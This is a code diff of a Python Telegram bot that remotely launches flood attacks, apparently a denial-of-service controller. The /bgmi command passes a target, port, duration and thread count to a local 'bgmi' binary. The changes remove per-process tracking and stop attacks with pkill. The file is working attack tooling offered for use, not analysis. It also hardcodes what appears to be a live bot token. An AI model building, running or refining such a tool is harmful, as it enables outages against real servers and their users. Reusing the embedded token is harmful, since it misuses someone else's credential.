@@ -1,8 +1,6 @@
 import telebot
 import subprocess
-import shlex  # For safely passing shell arguments
-import datetime
-import signal
+import shlex
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7982475022:AAEQEGAasDWFQ6371BMqVyPpVNqaGoIn9BM')
@@ -10,23 +8,17 @@ bot = telebot.TeleBot('7982475022:AAEQEGAasDWFQ6371BMqVyPpVNqaGoIn9BM')
 # List to store allowed user IDs
 allowed_user_ids = ["916136692"]  # Replace with actual user IDs
 
-# Global variable to track the running attack process
-attack_process = None
-
 # Function to start the attack and send a reply to the user
 def start_attack_reply(message, target, port, time=500, threads=500):
-    global attack_process
-
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
 
     response = (f"{username}, Attack Started.\n\n"
-                f"Taget: {target}\n𝐏𝐨𝐫𝐭: {port}\n"
-                f"Time: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n"
+                f"Target: {target}\nPort: {port}\n"
+                f"Time: {time} Seconds\nThreads: {threads}\n"
                 "\nBy @takedown001")
     bot.reply_to(message, response)
 
-    # Sanitize the inputs before executing shell commands
     try:
         port = int(port)
         time = int(time)
@@ -36,28 +28,23 @@ def start_attack_reply(message, target, port, time=500, threads=500):
         full_command = f"./bgmi {shlex.quote(target)} {port} {time} {threads}"
 
         # Start the attack process
-        attack_process = subprocess.Popen(full_command, shell=True)
+        subprocess.Popen(full_command, shell=True)
 
         bot.reply_to(message, "Attack is running.")
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
 
-# Function to cancel the currently running attack
+# Function to cancel the currently running attack using pkill
 def cancel_attack(message):
-    global attack_process
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
 
-    if attack_process is not None:
-        try:
-            attack_process.terminate()  # Try to terminate the process
-            attack_process.wait()  # Wait for process to terminate
-            bot.reply_to(message, f"{username}, the attack has been canceled successfully.")
-            attack_process = None  # Reset the process variable
-        except Exception as e:
-            bot.reply_to(message, f"Error in canceling the attack: {str(e)}")
-    else:
-        bot.reply_to(message, "No attack is currently running.")
+    try:
+        # Use pkill to terminate all bgmi processes
+        subprocess.run(['pkill', '-f', 'bgmi'])  # Use -f to match the full command
+        bot.reply_to(message, f"{username}, the attack has been canceled successfully.")
+    except Exception as e:
+        bot.reply_to(message, f"Error in canceling the attack: {str(e)}")
 
 # Handler for the /bgmi command to start the attack
 @bot.message_handler(commands=['bgmi'])
